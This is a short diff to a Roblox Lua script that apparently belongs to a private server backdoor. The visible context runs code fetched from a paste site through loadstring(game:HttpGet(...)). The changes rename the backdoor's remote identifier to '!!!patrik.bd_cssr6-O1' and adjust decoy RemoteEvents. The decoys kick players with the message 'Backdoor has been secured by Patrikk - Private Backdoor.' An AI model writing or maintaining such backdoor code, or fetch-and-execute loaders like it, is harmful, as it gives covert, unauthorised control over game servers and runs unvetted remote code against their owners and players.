@@ -86,7 +86,7 @@ local notify = loadstring(game:HttpGet("https://pastefy.app/JNTqAzrn/raw", true)
         if name == "spunch.bd_cssr6-O1" then
                 return false
         end
-        if name == "patrik.bd_cssr6-O1" then
+        if name == "!!!patrik.bd_cssr6-O1" then
                 return false
         end
 		if name == "ChatEvent" then
@@ -3248,9 +3248,9 @@ local services = {
 }
 
 for _, svc in ipairs(services) do
-  for r = 1, 50 do 
+  for r = 1, 40 do 
     local s = Instance.new("RemoteEvent")
-    s.Name = "patrik.bd_cssr6-O1"
+    s.Name = "!!!patrik.bd_cssr6-O1"
     s.OnServerEvent:Connect(function(player)
         player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
     end)
